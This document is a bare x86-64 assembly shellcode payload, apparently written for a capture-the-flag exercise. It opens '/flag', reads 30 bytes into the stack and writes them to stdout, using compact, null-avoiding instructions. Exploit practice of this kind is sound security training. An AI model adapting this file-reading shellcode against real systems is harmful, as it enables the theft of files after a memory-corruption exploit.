.intel_syntax noprefix
_start:
    mov al,2
    xor esi,esi
    xor edi,edi  
    mov byte ptr [rsp],'/'
    mov byte ptr [rsp+1],'f'
    mov byte ptr [rsp+2],'l'
    mov byte ptr [rsp+3],'a'
    mov byte ptr [rsp+4],'g'
    mov byte ptr [rsp+5],0
    push rsp
    pop rdi
    syscall

    push rax
    pop rdi
    xor eax,eax
    push rsp
    pop rsi
    mov dl,30
    syscall

    mov al,1
    mov dil,1
    syscall 

    mov al,60
    syscall

